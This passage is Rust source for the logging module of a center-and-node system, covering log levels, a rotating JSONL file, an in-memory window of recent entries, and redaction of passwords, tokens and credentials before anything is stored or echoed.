//! The log of the center and of the node: levels, redaction, a file in the
//! state folder and a window of the latest entries in memory for the center's
//! web UI. It is not the audit log: that one records every decision about a
//! call, here go links, pairing, changes, refused and failed calls, errors,
//! start and stop (docs/dev/logging.md).
//!
//! Events reach a [`Log`] in two ways. The `tracing` macros do, through the
//! [`LogLayer`] that [`install`] sets up for the process; the center also calls
//! [`Log::record`] itself, so one center's entries are its own and a test does
//! not need a process-wide subscriber. Whatever the way, an entry is cut to a
//! fixed length and has its secrets replaced before it is stored, echoed or
//! written ([`redact`]).

use std::collections::VecDeque;
use std::fmt;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
use std::sync::{Arc, Mutex, MutexGuard, OnceLock};
use std::time::Instant;

use nerve_proto::text::clip;
use nerve_proto::{ErrorCode, RpcError};
use serde::{Deserialize, Serialize};
use tracing::field::{Field, Visit};
use tracing::subscriber::Interest;
use tracing::{Event, Metadata, Subscriber};
use tracing_subscriber::layer::{Context, SubscriberExt};
use tracing_subscriber::{Layer, Registry};

/// The log file in a state folder; the older one is `log.jsonl.1`.
pub const FILE: &str = "log.jsonl";
/// The size at which the file is moved aside to `log.jsonl.1`, which replaces
/// the older one: the log never takes much more than twice this.
pub const MAX_BYTES: u64 = 5 * 1024 * 1024;
/// How many of the latest entries a [`Log`] keeps for its view.
pub const KEEP: usize = 2000;
/// The most characters of one entry's message; a longer one is cut.
pub const MSG_MAX: usize = 1000;
/// How long a full file that cannot be moved aside is left alone before the
/// move is tried again.
const RETRY_AFTER: std::time::Duration = std::time::Duration::from_secs(10);
/// What stands in for a secret.
pub const REDACTED: &str = "[redacted]";
/// A [`Query`] node that selects the entries about no node at all.
pub const NO_NODE: &str = "-";

/// How much is logged. Each level includes the ones before it.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Default, Serialize, Deserialize,
)]
#[serde(rename_all = "lowercase")]
pub enum Level {
    /// Something the program cannot handle and the owner has to act on.
    Error,
    /// Something wrong that the program handled: a link lost, a failed call.
    Warn,
    /// What happens in normal use: links, pairing, changes, refused calls.
    #[default]
    Info,
    /// Detail for tracking down a problem.
    Debug,
}

impl Level {
    pub const ALL: [Level; 4] = [Level::Error, Level::Warn, Level::Info, Level::Debug];

    pub fn as_str(self) -> &'static str {
        match self {
            Level::Error => "error",
            Level::Warn => "warn",
            Level::Info => "info",
            Level::Debug => "debug",
        }
    }

    /// `error`, `warn`, `info` or `debug` in any letter case; `trace` and
    /// `warning` are taken for `debug` and `warn`.
    pub fn parse(s: &str) -> Option<Level> {
        match s.trim().to_ascii_lowercase().as_str() {
            "error" => Some(Level::Error),
            "warn" | "warning" => Some(Level::Warn),
            "info" => Some(Level::Info),
            "debug" | "trace" => Some(Level::Debug),
            _ => None,
        }
    }

    fn from_u8(n: u8) -> Level {
        Level::ALL[usize::from(n).min(Level::ALL.len() - 1)]
    }
}

impl fmt::Display for Level {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

impl std::str::FromStr for Level {
    type Err = String;

    fn from_str(s: &str) -> Result<Level, String> {
        Level::parse(s).ok_or_else(|| "expected error, warn, info or debug".into())
    }
}

impl From<tracing::Level> for Level {
    fn from(l: tracing::Level) -> Level {
        if l == tracing::Level::ERROR {
            Level::Error
        } else if l == tracing::Level::WARN {
            Level::Warn
        } else if l == tracing::Level::INFO {
            Level::Info
        } else {
            Level::Debug
        }
    }
}

/// One line of the log.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Entry {
    /// Milliseconds since the Unix epoch.
    pub ts: u64,
    pub level: Level,
    /// The node the entry is about (in the center's log), by the name it had
    /// then.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub node: Option<String>,
    /// Its id, which a rename does not change.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub node_id: Option<String>,
    pub msg: String,
}

/// Which entries a view wants.
#[derive(Debug, Clone, Default)]
pub struct Query {
    /// The least severe level to show: `warn` shows warnings and errors.
    pub level: Option<Level>,
    /// A node id, or [`NO_NODE`].
    pub node: Option<String>,
    /// Text the message or the node's name contains, in any letter case.
    pub text: Option<String>,
    /// Only entries numbered above this one.
    pub after: Option<u64>,
    /// At most this many, the newest.
    pub limit: usize,
}

struct Inner {
    /// The latest entries with their numbers, oldest first. The numbers only
    /// grow, so a view can ask for what came after the last one it has.
    ring: VecDeque<(u64, Entry)>,
    next: u64,
    sink: Option<Sink>,
    /// Secrets the program holds (a harness token, the sudo password) by the
    /// slot that holds them.
    secrets: Vec<(&'static str, String)>,
}

pub struct Log {
    level: AtomicU8,
    echo: AtomicBool,
    inner: Mutex<Inner>,
}

impl fmt::Debug for Log {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("Log")
            .field("level", &self.level())
            .finish_non_exhaustive()
    }
}

impl Log {
    /// A log that keeps the latest entries in memory. [`Log::attach_file`]
    /// adds the file.
    pub fn new(level: Level) -> Arc<Log> {
        Arc::new(Log {
            level: AtomicU8::new(level as u8),
            echo: AtomicBool::new(false),
            inner: Mutex::new(Inner {
                ring: VecDeque::new(),
                next: 1,
                sink: None,
                secrets: Vec::new(),
            }),
        })
    }

    #[track_caller]
    fn lock(&self) -> MutexGuard<'_, Inner> {
        crate::sync::lock(&self.inner)
    }

    /// Panics while it holds the log's lock, for a test of a poisoned one.
    #[cfg(test)]
    pub(crate) fn poison_for_test(&self) {
        let _g = self.lock();
        panic!("a panic under the log's lock, on purpose");
    }

    pub fn level(&self) -> Level {
        Level::from_u8(self.level.load(Ordering::Relaxed))
    }

    /// Takes effect for the next entry, also for `tracing` events: the layer
    /// asks on every one.
    pub fn set_level(&self, level: Level) {
        self.level.store(level as u8, Ordering::Relaxed);
    }

    pub fn enabled(&self, level: Level) -> bool {
        level <= self.level()
    }

    /// Whether every entry is also printed to stderr.
    pub fn set_echo(&self, on: bool) {
        self.echo.store(on, Ordering::Relaxed);
    }

    /// Keeps `value` out of every entry from now on, wherever it appears.
    /// `slot` names the holder, so a new value replaces the old one and
    /// `None` clears it.
    pub fn set_secret(&self, slot: &'static str, value: Option<&str>) {
        let mut g = self.lock();
        g.secrets.retain(|(s, _)| *s != slot);
        if let Some(v) = value.filter(|v| !v.is_empty()) {
            g.secrets.push((slot, v.to_string()));
        }
    }

    /// Writes the log to `path` (and `path.1` once it is full). The entries
    /// already in the file come back into the window, followed by those made
    /// before the file was attached, which are then written too.
    pub fn attach_file(&self, path: impl Into<PathBuf>) -> std::io::Result<()> {
        self.attach_file_with_limit(path, MAX_BYTES)
    }

    /// [`Log::attach_file`] with another size at which the file is moved
    /// aside, for a test.
    pub fn attach_file_with_limit(
        &self,
        path: impl Into<PathBuf>,
        max_bytes: u64,
    ) -> std::io::Result<()> {
        let path = path.into();
        if let Some(dir) = path.parent() {
            crate::files::create_private_dir(dir)?;
        }
        let mut sink = Sink::new(path, max_bytes);
        let past = sink.read_entries()?;
        // Opened now, so a file that cannot be written is told at once.
        sink.open()?;
        let mut g = self.lock();
        let fresh: Vec<Entry> = g.ring.drain(..).map(|(_, e)| e).collect();
        for e in past {
            g.push(e);
        }
        g.sink = Some(sink);
        for e in fresh {
            g.write(&e);
            g.push(e);
        }
        Ok(())
    }

    /// Appends one entry to the log file `path` without attaching a `Log`:
    /// nothing of the file is read, and it is never moved aside, so a
    /// program that runs beside the center (the updater, as root) neither
    /// waits on nor loads a file the center's account has swapped. A link
    /// or a file that is not a regular one is refused. The message is
    /// [`scrub`]bed.
    pub fn append_entry(path: &Path, level: Level, msg: &str) -> std::io::Result<()> {
        let mut o = std::fs::OpenOptions::new();
        o.create(true).append(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            // No wait on a pipe, no link followed.
            o.mode(0o600)
                .custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
        }
        let mut f = o.open(path)?;
        if !f.metadata()?.is_file() {
            return Err(std::io::Error::other(format!(
                "{} is not a regular file",
                path.display()
            )));
        }
        let e = Entry {
            ts: nerve_proto::msg::now_ms(),
            level,
            node: None,
            node_id: None,
            msg: scrub(msg),
        };
        let mut line = serde_json::to_string(&e).unwrap_or_default();
        line.push('\n');
        f.write_all(line.as_bytes())
    }

    /// Makes an entry: below the level it is dropped. The message is cut and
    /// stripped of secrets. `node` is the node's name and id.
    pub fn record(&self, level: Level, node: Option<(&str, &str)>, msg: &str) {
        if !self.enabled(level) {
            return;
        }
        let mut g = self.lock();
        let entry = Entry {
            ts: nerve_proto::msg::now_ms(),
            level,
            node: node.map(|(n, _)| n.to_string()),
            node_id: node
                .map(|(_, i)| i)
                .filter(|i| !i.is_empty())
                .map(str::to_string),
            msg: g.clean(msg),
        };
        g.write(&entry);
        g.push(entry.clone());
        drop(g);
        if self.echo.load(Ordering::Relaxed) {
            eprintln!("{}", echo_line(&entry));
        }
    }

    /// The entries `q` asks for, newest first, with their numbers.
    pub fn entries(&self, q: &Query) -> Vec<(u64, Entry)> {
        let text = q
            .text
            .as_deref()
            .map(str::trim)
            .filter(|t| !t.is_empty())
            .map(str::to_lowercase);
        let wants = |seq: u64, e: &Entry| {
            q.after.is_none_or(|a| seq > a)
                && q.level.is_none_or(|l| e.level <= l)
                && match q.node.as_deref() {
                    None => true,
                    Some(NO_NODE) => e.node_id.is_none() && e.node.is_none(),
                    Some(id) => e.node_id.as_deref() == Some(id),
                }
                && text.as_ref().is_none_or(|t| {
                    e.msg.to_lowercase().contains(t)
                        || e.node
                            .as_deref()
                            .is_some_and(|n| n.to_lowercase().contains(t))
                })
        };
        self.lock()
            .ring
            .iter()
            .rev()
            .filter(|(seq, e)| wants(*seq, e))
            .take(q.limit)
            .cloned()
            .collect()
    }

    /// The nodes the window has entries about: id and the name they had last.
    pub fn nodes(&self) -> Vec<(String, String)> {
        let mut out: Vec<(String, String)> = Vec::new();
        for (_, e) in &self.lock().ring {
            let (Some(id), Some(name)) = (&e.node_id, &e.node) else {
                continue;
            };
            match out.iter_mut().find(|(i, _)| i == id) {
                Some(known) => known.1.clone_from(name),
                None => out.push((id.clone(), name.clone())),
            }
        }
        out
    }

    /// The whole file as it is written, the older one first, for a download.
    /// `None` without a file.
    pub fn file_bytes(&self) -> Option<std::io::Result<Vec<u8>>> {
        let g = self.lock();
        let sink = g.sink.as_ref()?;
        Some(sink.read_all())
    }

    pub fn file_path(&self) -> Option<PathBuf> {
        self.lock().sink.as_ref().map(|s| s.path.clone())
    }

    pub fn layer(self: &Arc<Self>) -> LogLayer {
        LogLayer(self.clone())
    }
}

impl Inner {
    /// `msg` as an entry keeps it: the secrets the program holds go first,
    /// as they were written, then [`scrub`].
    fn clean(&self, msg: &str) -> String {
        let mut text = msg.to_string();
        for (_, secret) in &self.secrets {
            text = hide(&text, secret);
        }
        scrub(&text)
    }

    fn push(&mut self, e: Entry) {
        let seq = self.next;
        self.next += 1;
        self.ring.push_back((seq, e));
        while self.ring.len() > KEEP {
            self.ring.pop_front();
        }
    }

    /// Writes the entry to the file. A file that cannot be written is told
    /// once on stderr, not in the log that cannot take it.
    fn write(&mut self, e: &Entry) {
        let Some(sink) = &mut self.sink else { return };
        let mut line = serde_json::to_string(e).unwrap_or_default();
        line.push('\n');
        match sink.append(line.as_bytes()) {
            Ok(()) => sink.failed = false,
            Err(err) => {
                if !std::mem::replace(&mut sink.failed, true) {
                    eprintln!("cannot write the log {}: {err}", sink.path.display());
                }
            }
        }
    }
}

/// The log file and its size.
struct Sink {
    path: PathBuf,
    file: Option<std::fs::File>,
    len: u64,
    max: u64,
    /// The last write failed and said so.
    failed: bool,
    /// The file is full and could not be moved aside: no new try before this.
    blocked: Option<Instant>,
    /// Why the last move failed, for the message.
    move_error: Option<String>,
}

impl Sink {
    fn new(path: PathBuf, max: u64) -> Sink {
        Sink {
            path,
            file: None,
            len: 0,
            max,
            failed: false,
            blocked: None,
            move_error: None,
        }
    }

    fn old_path(&self) -> PathBuf {
        let mut p = self.path.clone().into_os_string();
        p.push(".1");
        p.into()
    }

    fn open(&mut self) -> std::io::Result<()> {
        if self.file.is_some() {
            return Ok(());
        }
        let mut o = std::fs::OpenOptions::new();
        o.create(true).append(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            o.mode(0o600);
        }
        let f = o.open(&self.path)?;
        self.len = f.metadata()?.len();
        self.file = Some(f);
        Ok(())
    }

    fn append(&mut self, line: &[u8]) -> std::io::Result<()> {
        self.open()?;
        if self.len > 0 && self.len + line.len() as u64 > self.max {
            self.make_room()?;
        }
        let f = self.file.as_mut().expect("opened above");
        // One write per line, so a reader never sees half of one for long.
        if let Err(e) = f.write_all(line) {
            self.file = None;
            return Err(e);
        }
        self.len += line.len() as u64;
        Ok(())
    }

    /// Makes room in a full file: it is moved to `log.jsonl.1`. When it cannot
    /// be (the older file is held, a reader keeps this one open on Windows), it
    /// is copied there and started again in place, so it never grows past its
    /// limit. When even the copy fails, the file is left as it is, with its
    /// lines, and nothing is written to it until it can be moved; the error is
    /// the caller's to tell. The move is tried again at most every
    /// [`RETRY_AFTER`], so a held file does not cost a copy per line.
    fn make_room(&mut self) -> std::io::Result<()> {
        if self.blocked.is_some_and(|until| Instant::now() < until) {
            return Err(self.cannot_move());
        }
        self.blocked = None;
        self.file = None;
        if let Err(e) = std::fs::rename(&self.path, self.old_path()) {
            let copied = std::fs::copy(&self.path, self.old_path());
            if copied.is_err() {
                self.blocked = Some(Instant::now() + RETRY_AFTER);
                self.move_error = Some(e.to_string());
                return Err(self.cannot_move());
            }
            std::fs::OpenOptions::new()
                .write(true)
                .truncate(true)
                .open(&self.path)?;
        }
        self.open()
    }

    fn cannot_move(&self) -> std::io::Error {
        std::io::Error::other(format!(
            "the file is full and cannot be moved or copied aside ({}); lines are not written to it until it can be",
            self.move_error.as_deref().unwrap_or("it is held")
        ))
    }

    /// The whole lines of both files, the older first.
    fn read_all(&self) -> std::io::Result<Vec<u8>> {
        let mut out = Vec::new();
        for p in [self.old_path(), self.path.clone()] {
            match std::fs::read(&p) {
                Ok(t) => {
                    let whole = t.iter().rposition(|b| *b == b'\n').map_or(0, |i| i + 1);
                    out.extend_from_slice(&t[..whole]);
                }
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(e) => return Err(e),
            }
        }
        Ok(out)
    }

    /// The latest [`KEEP`] entries of both files; lines that do not parse are
    /// skipped.
    fn read_entries(&self) -> std::io::Result<Vec<Entry>> {
        let all = self.read_all()?;
        let mut entries: Vec<Entry> = String::from_utf8_lossy(&all)
            .lines()
            .filter_map(|l| serde_json::from_str(l).ok())
            .collect();
        let extra = entries.len().saturating_sub(KEEP);
        entries.drain(..extra);
        Ok(entries)
    }
}

/// A held secret shorter than this is replaced only where it stands as a word
/// of its own.
const WHOLE_WORD_BELOW: usize = 8;

/// `text` with the secret `secret` replaced by [`REDACTED`]. A long secret goes
/// wherever it is. A short one (a four-digit password, a two-letter word) goes
/// only as a whole word: replaced inside other words it would garble the
/// line, and the places it was cut would spell it out.
fn hide(text: &str, secret: &str) -> String {
    if secret.chars().count() >= WHOLE_WORD_BELOW {
        return text.replace(secret, REDACTED);
    }
    let word = |c: char| c.is_alphanumeric() || c == '_';
    // An end of the secret that is not a word character needs no boundary.
    let (first, last) = (
        secret.chars().next().is_some_and(word),
        secret.chars().next_back().is_some_and(word),
    );
    let mut out = String::with_capacity(text.len());
    let mut at = 0;
    for (i, m) in text.match_indices(secret) {
        let end = i + m.len();
        let before = !first || !text[..i].chars().next_back().is_some_and(word);
        let after = !last || !text[end..].chars().next().is_some_and(word);
        if before && after {
            out.push_str(&text[at..i]);
            out.push_str(REDACTED);
            at = end;
        }
    }
    out.push_str(&text[at..]);
    out
}

/// `text` as one line of the log: control characters become spaces, so the
/// redaction sees one line of words, then [`redact`], cut to [`MSG_MAX`]
/// characters. Whatever else shows a line of the log (the Windows Event
/// Log of the node) goes through this too. It takes no lock, so a panic hook
/// may call it.
pub fn scrub(text: &str) -> String {
    let flat: String = text
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    clip(&redact(&flat), MSG_MAX)
}

/// A length of time for a person: `850 ms`, `12 s`, `3 min 4 s`, `10 min`,
/// `2 h 5 min`, `3 d 5 h`. A zero part is left out.
pub fn span(d: std::time::Duration) -> String {
    let (ms, s) = (d.as_millis(), d.as_secs());
    let two = |big: u64, big_unit: &str, small: u64, small_unit: &str| match small {
        0 => format!("{big} {big_unit}"),
        _ => format!("{big} {big_unit} {small} {small_unit}"),
    };
    match s {
        0 => format!("{ms} ms"),
        1..=59 => format!("{s} s"),
        60..=3599 => two(s / 60, "min", s % 60, "s"),
        3600..=172_799 => two(s / 3600, "h", s % 3600 / 60, "min"),
        _ => two(s / 86_400, "d", s % 86_400 / 3600, "h"),
    }
}

// ---- Calls ----

/// How a call that did not produce a result is told in the log.
#[derive(Debug, PartialEq, Eq)]
pub enum Outcome {
    /// The policy said no (the node's, or the owner's switch in the center).
    Refused,
    /// It ran or tried to, and did not come out.
    Failed,
    /// The harness cancelled it.
    Cancelled,
}

/// The level and the kind of a call that ended with `code`. Refusals are
/// normal use of a policy, so they are info; a failure the owner can do
/// something about (an offline node, a timeout, a busy node) is a warning, a
/// fault of the center or the node is an error. What the node's own code
/// says about the call (`io`, `bad_path`, `conflict`) or the agent's
/// arguments is info: it is not the program that is wrong. `refused_here` is
/// a refusal that came in another code: the center's own switch for a node
/// answers `unavailable`.
pub fn call_outcome(code: &ErrorCode, refused_here: bool) -> (Level, Outcome) {
    match code {
        _ if refused_here => (Level::Info, Outcome::Refused),
        ErrorCode::Forbidden | ErrorCode::Disabled => (Level::Info, Outcome::Refused),
        ErrorCode::Cancelled => (Level::Debug, Outcome::Cancelled),
        ErrorCode::Internal => (Level::Error, Outcome::Failed),
        ErrorCode::Unavailable
        | ErrorCode::Busy
        | ErrorCode::Timeout
        | ErrorCode::TooLarge
        | ErrorCode::ConnectionLost => (Level::Warn, Outcome::Failed),
        ErrorCode::InvalidArgs
        | ErrorCode::UnknownCapability
        | ErrorCode::UnknownMember
        | ErrorCode::Parse
        | ErrorCode::InvalidRequest
        | ErrorCode::MethodNotFound
        | ErrorCode::Other(_) => (Level::Info, Outcome::Failed),
    }
}

/// The level and the line for `what` (`fs.read`), which ended with `e` after
/// `took`: that it was refused, failed or cancelled, with the reason the
/// error gives.
pub fn call_line(
    what: &str,
    e: &RpcError,
    took: std::time::Duration,
    refused_here: bool,
) -> (Level, String) {
    let (level, outcome) = call_outcome(&e.kind(), refused_here);
    let code = e.kind();
    let reason = clip(&e.message, 300);
    let line = match outcome {
        Outcome::Cancelled => format!("{what} was cancelled after {}", span(took)),
        Outcome::Refused => format!("{what} was refused ({}): {reason}", code.as_str()),
        Outcome::Failed => format!(
            "{what} failed ({}) after {}: {reason}",
            code.as_str(),
            span(took)
        ),
    };
    (level, line)
}

// ---- Redaction ----

/// Names whose value is a secret when one follows (`name=value`,
/// `name: value`, `"name":"value"`), in any letter case.
const SECRET_KEYS: [&str; 14] = [
    "password",
    "passwd",
    "passphrase",
    "pwd",
    "secret",
    "token",
    "api_key",
    "apikey",
    "api-key",
    "authorization",
    "cookie",
    "sealed",
    "private_key",
    "credential",
];

/// `text` without secrets. It takes out what the program itself would write
/// in a message and could leak: a value after a name like `password` or
/// `token` (also as JSON), a bearer or basic credential, the user and password
/// of a URL, the `code` of a pairing link and a harness token (`nrv_…`). What
/// the program holds as a secret ([`Log::set_secret`]) is taken out as well.
/// The messages it writes itself name no secret to begin with; this is the
/// net under them for text it only passes on, like a refusal's reason or an
/// error from the system.
pub fn redact(text: &str) -> String {
    let t = redact_urls(text);
    let t = redact_credentials(&t);
    let t = redact_keyed(&t);
    redact_tokens(&t)
}

/// The end of a value that starts at `p`: to the next quote of a quoted value
/// (past escaped ones), else to the next space or delimiter. A value that
/// opens with an escaped quote (`\"value\"`, a JSON string inside a string, or
/// a command quoted with `{:?}`) ends at the next escaped quote, not at a bare
/// one. With no closing quote the value is the first word after the opening
/// one. Returns where the value starts and ends.
fn value_span(b: &[u8], mut p: usize) -> (usize, usize) {
    let first = p;
    while p < b.len() && b[p] == b'\\' {
        p += 1;
    }
    let escaped = p > first;
    if p < b.len() && matches!(b[p], b'"' | b'\'') {
        let quote = b[p];
        let start = p + 1;
        if escaped {
            if let Some(k) = (start..b.len()).find(|&k| b[k] == quote && b[k - 1] == b'\\') {
                return (start, k - 1);
            }
        } else {
            let mut k = start;
            while k < b.len() && b[k] != quote {
                k += if b[k] == b'\\' { 2 } else { 1 };
            }
            if k < b.len() {
                return (start, k);
            }
        }
        // A quote that is never closed ends no value: the secret is the word
        // after it, and the rest of the message stays.
        p = start;
    }
    let end = b[p..]
        .iter()
        .position(|c| {
            c.is_ascii_whitespace()
                || matches!(c, b',' | b';' | b'&' | b')' | b'}' | b']' | b'"' | b'\'')
        })
        .map_or(b.len(), |k| p + k);
    (p, end)
}

/// Replaces each `(start, end)` span of `text`, in order, by [`REDACTED`].
fn replace_spans(text: &str, spans: &[(usize, usize)]) -> String {
    let mut out = String::with_capacity(text.len());
    let mut at = 0;
    for &(start, end) in spans {
        out.push_str(&text[at..start]);
        out.push_str(REDACTED);
        at = end;
    }
    out.push_str(&text[at..]);
    out
}

/// `user:password@` in a URL.
fn redact_urls(text: &str) -> String {
    let b = text.as_bytes();
    let mut spans = Vec::new();
    let mut from = 0;
    while let Some(i) = text[from..].find("://") {
        let start = from + i + 3;
        let end = b[start..]
            .iter()
            .position(|c| c.is_ascii_whitespace() || matches!(c, b'/' | b'?' | b'#' | b'"' | b'\''))
            .map_or(b.len(), |k| start + k);
        if let Some(at) = text[start..end].rfind('@') {
            let info = &text[start..start + at];
            if info.contains(':') {
                spans.push((start, start + at));
            }
        }
        from = end.max(start);
    }
    replace_spans(text, &spans)
}

/// The credential after `Bearer` or `Basic`.
fn redact_credentials(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    let b = text.as_bytes();
    let mut spans = Vec::new();
    for scheme in ["bearer ", "basic "] {
        let mut from = 0;
        while let Some(i) = lower[from..].find(scheme) {
            let start = from + i + scheme.len();
            let (s, e) = value_span(b, start);
            from = e.max(start);
            if e > s && !text[s..e].starts_with(REDACTED) {
                spans.push((s, e));
            }
        }
    }
    merge_spans(&mut spans);
    replace_spans(text, &spans)
}

/// Sorts spans and joins those that touch.
fn merge_spans(spans: &mut Vec<(usize, usize)>) {
    spans.sort_unstable();
    let mut out: Vec<(usize, usize)> = Vec::new();
    for &(s, e) in spans.iter() {
        match out.last_mut() {
            Some(last) if s <= last.1 => last.1 = last.1.max(e),
            _ => out.push((s, e)),
        }
    }
    *spans = out;
}

/// Whether `c` can be part of a word of a command line.
fn is_word_byte(c: u8) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, b'-' | b'_')
}

/// Whether the name that spans `start..end` is a command-line flag
/// (`--password`, `--with-token`) and ends there.
fn is_flag(b: &[u8], start: usize, end: usize) -> bool {
    if end < b.len() && is_word_byte(b[end]) {
        return false;
    }
    let mut word = start;
    while word > 0 && is_word_byte(b[word - 1]) {
        word -= 1;
    }
    b[word..].starts_with(b"--")
}

/// The value after a secret name, and the `code` of a pairing link: after
/// `=` or `:`, or, for a flag, after a space (`--password hunter2`). The
/// credential of `Authorization: <scheme> <credential>` is the word after the
/// scheme, whatever the scheme is.
fn redact_keyed(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    let (b, lb) = (text.as_bytes(), lower.as_bytes());
    let blank = |c: u8| matches!(c, b' ' | b'\t');
    let mut spans = Vec::new();
    let mut j = 0;
    while j < b.len() {
        let key = SECRET_KEYS
            .iter()
            .find(|k| lb[j..].starts_with(k.as_bytes()))
            .map(|k| (*k, j + k.len()))
            // `code=` is a pairing link's secret, only as a URL parameter.
            .or_else(|| {
                (j > 0 && matches!(b[j - 1], b'?' | b'&') && lb[j..].starts_with(b"code="))
                    .then_some(("code", j + 4))
            });
        let Some((name, key_end)) = key else {
            j += 1;
            continue;
        };
        // The end of a quoted name in JSON, then the separator.
        let mut p = key_end;
        while p < b.len() && (blank(b[p]) || matches!(b[p], b'"' | b'\'' | b'\\')) {
            p += 1;
        }
        let mut value = None;
        if p < b.len() && matches!(b[p], b'=' | b':') && !text[p + 1..].starts_with("//") {
            p += 1;
            while p < b.len() && blank(b[p]) {
                p += 1;
            }
            let (s, mut e) = value_span(b, p);
            if name == "authorization" && e > s {
                let mut q = e;
                while q < b.len() && blank(b[q]) {
                    q += 1;
                }
                let (s2, e2) = value_span(b, q);
                if q > e && e2 > s2 {
                    e = e2;
                }
            }
            value = Some((s, e));
        } else if is_flag(b, j, key_end) {
            let mut q = key_end;
            while q < b.len() && blank(b[q]) {
                q += 1;
            }
            // Prose that names a flag (`set --harness-token (NERVE_…)`) is not
            // a flag with a value.
            if q > key_end
                && q < b.len()
                && !matches!(b[q], b'(' | b'<' | b'[' | b'{' | b'-' | b'$')
            {
                value = Some(value_span(b, q));
            }
        }
        if let Some((s, e)) = value
            && e > s
            && !text[s..e].starts_with(REDACTED)
        {
            spans.push((s, e));
            j = e;
            continue;
        }
        j += 1;
    }
    replace_spans(text, &spans)
}

/// A harness token made by the center: `nrv_` and its random part.
fn redact_tokens(text: &str) -> String {
    const PREFIX: &str = "nrv_";
    let b = text.as_bytes();
    let mut spans = Vec::new();
    let mut from = 0;
    while let Some(i) = text[from..].find(PREFIX) {
        let start = from + i;
        let end = start
            + PREFIX.len()
            + b[start + PREFIX.len()..]
                .iter()
                .take_while(|c| c.is_ascii_alphanumeric() || matches!(c, b'_' | b'-'))
                .count();
        from = end;
        if end - start >= PREFIX.len() + 8 {
            spans.push((start, end));
        }
    }
    replace_spans(text, &spans)
}

// ---- Time ----

/// `2026-10-13T14:03:22.123Z`, for the line on stderr.
fn iso(ms: u64) -> String {
    let secs = ms / 1000;
    let (days, rest) = (secs / 86_400, secs % 86_400);
    // Civil date from a day count (H. Hinnant's algorithm).
    let z = days as i64 + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let day = doy - (153 * mp + 2) / 5 + 1;
    let month = if mp < 10 { mp + 3 } else { mp - 9 };
    let year = yoe + era * 400 + i64::from(month <= 2);
    format!(
        "{year:04}-{month:02}-{day:02}T{:02}:{:02}:{:02}.{:03}Z",
        rest / 3600,
        rest % 3600 / 60,
        rest % 60,
        ms % 1000
    )
}

/// The line an entry makes on stderr.
fn echo_line(e: &Entry) -> String {
    let level = e.level.as_str().to_ascii_uppercase();
    match &e.node {
        Some(n) => format!("{} {level:5} {n}: {}", iso(e.ts), e.msg),
        None => format!("{} {level:5} {}", iso(e.ts), e.msg),
    }
}

// ---- tracing ----

/// Hands every `tracing` event to a [`Log`]. The fields `node` (a name) and
/// `node_id` say what the event is about; the others are put after the
/// message as `name=value`.
pub struct LogLayer(Arc<Log>);

#[derive(Default)]
struct Fields {
    msg: String,
    node: Option<String>,
    node_id: Option<String>,
    extra: Vec<(String, String)>,
}

impl Fields {
    fn put(&mut self, name: &str, value: String) {
        match name {
            "message" => self.msg = value,
            "node" => self.node = Some(value),
            "node_id" => self.node_id = Some(value),
            // The `log` crate's own bookkeeping.
            n if n.starts_with("log.") => {}
            n => self.extra.push((n.to_string(), value)),
        }
    }
}

impl Visit for Fields {
    fn record_str(&mut self, f: &Field, v: &str) {
        self.put(f.name(), v.to_string());
    }

    fn record_debug(&mut self, f: &Field, v: &dyn fmt::Debug) {
        self.put(f.name(), format!("{v:?}"));
    }
}

impl<S: Subscriber> Layer<S> for LogLayer {
    // The level changes while the program runs, so no callsite may be
    // remembered as disabled.
    fn register_callsite(&self, _: &'static Metadata<'static>) -> Interest {
        Interest::sometimes()
    }

    fn enabled(&self, m: &Metadata<'_>, _: Context<'_, S>) -> bool {
        self.0.enabled((*m.level()).into())
    }

    fn on_event(&self, event: &Event<'_>, _: Context<'_, S>) {
        let mut f = Fields::default();
        event.record(&mut f);
        let mut msg = f.msg;
        for (k, v) in &f.extra {
            if !msg.is_empty() {
                msg.push(' ');
            }
            msg.push_str(&format!("{k}={v}"));
        }
        let node = match (&f.node, &f.node_id) {
            (Some(n), Some(i)) => Some((n.as_str(), i.as_str())),
            (Some(n), None) => Some((n.as_str(), "")),
            _ => None,
        };
        self.0
            .record((*event.metadata().level()).into(), node, &msg);
    }
}

static GLOBAL: OnceLock<Arc<Log>> = OnceLock::new();

/// Makes the process's log and sends every `tracing` event to it, once; a
/// second call gives back the first. A subscriber installed before stays: the
/// log is then only fed by [`Log::record`].
pub fn install(level: Level, echo: bool) -> Arc<Log> {
    if let Some(log) = GLOBAL.get() {
        return log.clone();
    }
    let log = Log::new(level);
    log.set_echo(echo);
    let _ = tracing::subscriber::set_global_default(Registry::default().with(log.layer()));
    GLOBAL.get_or_init(|| log).clone()
}

/// The log [`install`] made, if it ran.
pub fn global() -> Option<Arc<Log>> {
    GLOBAL.get().cloned()
}

/// Logs through `tracing` at a level only known at run time. `node` is the
/// node's name and id.
pub fn emit(level: Level, node: Option<(&str, &str)>, msg: &str) {
    macro_rules! event {
        ($m:ident) => {
            match node {
                Some((n, i)) => tracing::$m!(node = n, node_id = i, "{msg}"),
                None => tracing::$m!("{msg}"),
            }
        };
    }
    match level {
        Level::Error => event!(error),
        Level::Warn => event!(warn),
        Level::Info => event!(info),
        Level::Debug => event!(debug),
    }
}

/// Where a state folder keeps its log.
pub fn file_in(dir: &Path) -> PathBuf {
